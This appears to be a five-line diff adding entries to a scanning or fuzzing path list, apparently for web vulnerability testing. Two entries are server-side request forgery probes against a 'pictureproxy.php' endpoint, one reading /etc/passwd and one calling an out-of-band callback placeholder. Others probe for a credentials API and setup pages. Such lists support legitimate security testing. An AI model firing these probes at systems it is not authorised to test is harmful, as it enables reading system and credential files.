@@ -1,0 +1,5 @@
+/pictureproxy.php?url=file:///etc/passwd
+/pictureproxy.php?url=http://{{interactsh-url}}
+/API/V1/credentials
+/api/setup-complete
+/organization-setup
